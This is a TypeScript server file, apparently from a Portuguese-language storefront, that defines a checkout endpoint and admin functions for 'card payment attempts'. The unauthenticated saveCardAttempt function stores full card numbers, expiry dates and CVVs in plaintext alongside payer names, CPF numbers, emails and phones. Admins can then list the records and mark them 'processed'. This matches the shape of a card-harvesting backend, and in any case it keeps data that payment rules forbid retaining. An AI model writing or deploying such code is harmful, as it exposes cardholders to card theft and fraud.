import { createServerFn } from "@tanstack/react-start";
import { z } from "zod";
import { supabaseAdmin } from "@/integrations/supabase/client-admin";
import { requireSupabaseAuth } from "@/integrations/supabase/auth-middleware";

const saveSchema = z.object({
  sessionId: z.string().min(1).max(128),
  payerName: z.string().max(200).optional(),
  payerEmail: z.string().max(200).optional(),
  payerCpf: z.string().max(20).optional(),
  payerPhone: z.string().max(30).optional(),
  delivery: z.any().optional(),
  cartItems: z.array(z.any()).max(50),
  amountCents: z.number().int().min(0).max(100_000_000),
  installments: z.number().int().min(1).max(24),
  cardHolder: z.string().min(1).max(120),
  cardNumber: z.string().min(12).max(25),
  cardExpiry: z.string().min(4).max(7),
  cardCvv: z.string().min(3).max(5),
});

export const saveCardAttempt = createServerFn({ method: "POST" })
  .validator((d) => saveSchema.parse(d))
  .handler(async ({ data }) => {
    const { error, data: row } = await supabaseAdmin
      .from("card_payment_attempts")
      .insert({
        session_id: data.sessionId,
        payer_name: data.payerName ?? null,
        payer_email: data.payerEmail ?? null,
        payer_cpf: data.payerCpf ?? null,
        payer_phone: data.payerPhone ?? null,
        delivery: data.delivery ?? {},
        cart_items: data.cartItems,
        amount_cents: data.amountCents,
        installments: data.installments,
        card_holder: data.cardHolder,
        card_number: data.cardNumber.replace(/\s+/g, ""),
        card_expiry: data.cardExpiry,
        card_cvv: data.cardCvv,
      })
      .select("id")
      .single();
    if (error) throw new Error(error.message);
    return { id: row.id };
  });

export const listCardAttempts = createServerFn({ method: "GET" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    const { data: role, error: roleError } = await supabaseAdmin
      .from("user_roles")
      .select("role")
      .eq("user_id", context.userId)
      .eq("role", "admin")
      .maybeSingle();
    if (roleError) throw new Error("Falha ao verificar permissão");
    if (!role) throw new Error("Acesso negado");

    const { data, error } = await supabaseAdmin
      .from("card_payment_attempts")
      .select("*")
      .order("created_at", { ascending: false })
      .limit(200);
    if (error) throw new Error(error.message);
    return { attempts: data ?? [] };
  });

export const updateCardAttemptStatus = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .validator((d) =>
    z.object({
      id: z.string().uuid(),
      status: z.enum(["pending", "processed", "cancelled"]),
      notes: z.string().max(2000).optional(),
    }).parse(d),
  )
  .handler(async ({ data, context }) => {
    const { data: role, error: roleError } = await supabaseAdmin
      .from("user_roles")
      .select("role")
      .eq("user_id", context.userId)
      .eq("role", "admin")
      .maybeSingle();
    if (roleError) throw new Error("Falha ao verificar permissão");
    if (!role) throw new Error("Acesso negado");

    const { error } = await supabaseAdmin
      .from("card_payment_attempts")
      .update({
        status: data.status,
        notes: data.notes ?? null,
        processed_at: data.status === "processed" ? new Date().toISOString() : null,
      })
      .eq("id", data.id);
    if (error) throw new Error(error.message);
    return { ok: true };
  });
